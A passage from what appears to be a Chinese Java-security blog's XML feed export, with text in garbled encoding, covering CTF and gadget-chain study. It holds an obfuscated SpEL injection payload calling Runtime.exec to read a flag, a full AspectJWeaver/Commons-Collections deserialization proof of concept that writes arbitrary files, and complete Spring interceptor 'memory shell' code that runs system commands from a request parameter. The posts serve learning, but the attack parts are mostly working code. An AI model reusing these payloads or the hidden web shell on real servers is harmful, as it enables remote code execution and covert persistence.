ï¼Œç„¶ååœ¨ä¿®æ”¹ç›¸åº”éƒ¨åˆ†è¯»å–flagã€‚</p><h4 id="åˆ©ç”¨Runtime"><a href="#åˆ©ç”¨Runtime" class="headerlink" title="åˆ©ç”¨Runtime"></a>åˆ©ç”¨Runtime</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">name=#&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner((T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;cat  /f1AgJvav&quot;</span>&#125;)).getInputStream(), <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;asfsfsdfsf&quot;</span>).next()&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>javaCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AspectJWeaver</title>
    <link href="/2022/04/24/AspectJWeaver/"/>
    <url>/2022/04/24/AspectJWeaver/</url>
    
    <content type="html"><![CDATA[<h1 id="AspectJWeaver"><a href="#AspectJWeaver" class="headerlink" title="AspectJWeaver"></a>AspectJWeaver</h1><p>ä»Šå¤©åšMRCTFçš„æ—¶å€™ï¼Œä¸çŸ¥é“æ€ä¹ˆä¸‹æ‰‹ã€‚å­¦é•¿ç»™äº†æˆ‘æç¤ºè¯´è¿™ä¸æ˜¯ysoé‡Œé¢ç›´æ¥æ‰“å˜›ï¼Ÿäºæ˜¯æˆ‘åˆæ‰¾åˆ°äº†<strong>su18</strong>~~ã€‚<br>ä¸çœ‹ä¸çŸ¥é“ä¸€çœ‹å“ä¸€è·³ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204241605695.png" alt="QQæˆªå›¾20220424160438"></p><p>è«æ€•å°±æ˜¯è€ƒè¿™ä¸ªå“Ÿã€‚</p><p>å…ˆè·Ÿå®Œé“¾å­å†è¯´ã€‚</p><h2 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>put<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimpleCache$StorableCachingMap</span>.</span></span>write<span class="hljs-constructor">ToPath()</span><br></code></pre></td></tr></table></figure><h2 id="SimpleCache-StorableCachingMap-put"><a href="#SimpleCache-StorableCachingMap-put" class="headerlink" title="SimpleCache$StorableCachingMap.put()"></a>SimpleCache$StorableCachingMap.put()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204241832557.png" alt="QQæˆªå›¾20220424161716"></p><p>è¿™é‡Œè°ƒç”¨äº†putï¼Œå¹¶ä¸”è¯¥é“¾å­ä¾èµ–äº†ccã€‚å¾ˆå®¹æ˜“è”æƒ³èµ·LazyMapã€‚æ¥ç€çœ‹ä¸€ä¸‹é“¾å­ã€‚</p><h2 id="SimpleCache-StorableCachingMap-writeToPath"><a href="#SimpleCache-StorableCachingMap-writeToPath" class="headerlink" title="SimpleCache$StorableCachingMap.writeToPath()"></a>SimpleCache$StorableCachingMap.writeToPath()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204241832080.png" alt="QQæˆªå›¾20220424161840"></p><p>è¿™é‡Œå†™å…¥äº†æ–‡ä»¶ã€‚<br>é‚£å…¶å®ä¸€ä¸ªå®Œæ•´çš„é“¾å­å°±å‡ºæ¥äº†ã€‚</p><h2 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(String.class, <span class="hljs-type">int</span>.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//ä½¿ç”¨haspmapå°è£…ä¸€ä¸‹</span><br>        HashMap&lt;String, Object&gt; map = (HashMap) constructor.newInstance(<span class="hljs-string">&quot;F://&quot;</span>, <span class="hljs-number">10000</span>);<br>        map.put(<span class="hljs-string">&quot;123.txt&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>.getBytes(StandardCharsets.UTF_8));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a>LazyMap.get()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204241832272.png" alt="QQæˆªå›¾20220424163521"></p><p>ä¸Šé¢çš„å°±æ˜¯cc6ä¸­çš„å†…å®¹ã€‚å°±ä¸å¤šæƒ³äº†ã€‚</p><p>å°±ç®€å•æƒ³äº†ä¸€ä¸‹ã€‚åˆ©ç”¨hashmapè§¦å‘TiedMapEntryçš„hashcodeï¼Œéšä¹‹è§¦å‘ TiedMapEntry.getValue()ã€‚ç„¶åè¿™é‡Œå°±æ˜¯åå°„å°†TiedMapEntryåˆ›å»ºçš„å¯¹è±¡åŠ å…¥åˆ°Hashsetä¸­ï¼ˆé¿å…åœ¨ååºåˆ—åŒ–ä¹‹å‰å°±è§¦å‘äº†æ¼æ´ï¼‰ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException &#123;<br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);<br>        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(String.class,<span class="hljs-type">int</span>.class);<br>        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> declaredConstructor.newInstance(<span class="hljs-string">&quot;F://&quot;</span>, <span class="hljs-number">10000</span>);<br><br>        <span class="hljs-comment">// åˆå§‹åŒ–ä¸€ä¸ª Transformerï¼Œä½¿å…¶ transform æ–¹æ³•è¿”å›è¦å†™å‡ºçš„ byte[] ç±»å‹çš„æ–‡ä»¶å†…å®¹</span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;aaaa&quot;</span>.getBytes(StandardCharsets.UTF_8));<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate((Map) o, transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span>   <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorate, <span class="hljs-string">&quot;123.txt&quot;</span>);<br><br>        HashSet&lt;Object&gt; objects = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>        objects.add(<span class="hljs-string">&quot;123&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> objects.getClass().getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        map.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> map.get(objects);<br><br>        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> objectObjectHashMap.getClass().getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        table.setAccessible(<span class="hljs-literal">true</span>);<br>        Object[] array = (Object[]) table.get(o1);<br><br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> array[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) &#123;<br>            node = array[<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br><br><br>        key.setAccessible(<span class="hljs-literal">true</span>);<br>        key.set(node, entry);<br><br><br>        serialize(objects);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>AspectJWeaver</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Springå†…å­˜é©¬ï¼šç¬¬äºŒå¤©ä¹‹Interceptor</title>
    <link href="/2022/04/21/Spring%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9A%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8BInterceptor/"/>
    <url>/2022/04/21/Spring%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9A%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8BInterceptor/</url>
    
    <content type="html"><![CDATA[<h1 id="Springå†…å­˜é©¬ï¼šç¬¬äºŒå¤©ä¹‹Interceptor"><a href="#Springå†…å­˜é©¬ï¼šç¬¬äºŒå¤©ä¹‹Interceptor" class="headerlink" title="Springå†…å­˜é©¬ï¼šç¬¬äºŒå¤©ä¹‹Interceptor"></a>Springå†…å­˜é©¬ï¼šç¬¬äºŒå¤©ä¹‹Interceptor</h1><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><p><a href="https://xz.aliyun.com/t/11039">https://xz.aliyun.com/t/11039</a></p><p><a href="https://cloud.tencent.com/developer/article/1972690">https://cloud.tencent.com/developer/article/1972690</a></p><p>å…³é”®ä¸€æ­¥ï¼š<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204212117981.png" alt="QQæˆªå›¾20220421201259"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204212117761.png" alt="QQæˆªå›¾20220421202611"></p><p>ä¹Ÿå°±æ˜¯è¯´åå°„æ§åˆ¶adaptedInterceptorsä¸ºæˆ‘ä»¬çš„æ¶æ„Interceptorå³å¯ã€‚å¹¶ä¸”è¿™é‡Œå°†Interceptorç”¨MappedInterceptorå°è£…ä¸€ä¸‹å³å¯ã€‚</p><h2 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.MappedInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">addInterceptor</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/add&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">add</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());<br><span class="hljs-comment">//        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><br>        <span class="hljs-type">InjectedInterceptor</span> <span class="hljs-variable">injectedInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectedInterceptor</span>();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">adaptedInterceptors</span> <span class="hljs-operator">=</span> mapping.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        adaptedInterceptors.setAccessible(<span class="hljs-literal">true</span>);<br>        List&lt;HandlerInterceptor&gt; handlerInterceptors = (List&lt;HandlerInterceptor&gt;) adaptedInterceptors.get(mapping);<br><br>        String[] path = &#123;<span class="hljs-string">&quot;/hello&quot;</span>&#125;;<br>        <span class="hljs-type">MappedInterceptor</span> <span class="hljs-variable">mappedInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MappedInterceptor</span>(path,<span class="hljs-literal">null</span> , injectedInterceptor);<br>        handlerInterceptors.add(mappedInterceptor );<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Inject done&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectedInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                res.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes,<span class="hljs-number">0</span>,len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204212117225.png" alt="QQæˆªå›¾20220421211545"></p>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SprinGå†…å­˜é©¬ï¼šç¬¬äºŒå¤©ä¹‹Controller</title>
    <link href="/2022/04/21/SprinG%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9A%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8BController/"/>
    <url>/2022/04/21/SprinG%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9A%E7%AC%AC%E4%BA%8C%E5%A4%A9%E4%B9%8BController/</url>
    
    <content type="html"><![CDATA[<h1 id="Springå†…å­˜é©¬-ç¬¬äºŒå¤©"><a href="#Springå†…å­˜é©¬-ç¬¬äºŒå¤©" class="headerlink" title="Springå†…å­˜é©¬ ç¬¬äºŒå¤©"></a>Springå†…å­˜é©¬ ç¬¬äºŒå¤©</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p><a href="https://www.bilibili.com/video/BV1H44y1r7fs?spm_id_from=333.999.0.0">æ¡†æ¶éƒ¨ç½²ï¼ˆåªçœ‹äº†ä¸€é›†emmmè¿˜æ˜¯äºŒå€é€Ÿï¼‰</a></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204202031877.png" alt="QQæˆªå›¾20220420203054"></p><h3 id="spring-servlet"><a href="#spring-servlet" class="headerlink" title="spring-servlet"></a>spring-servlet</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:aop</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:mvc</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span 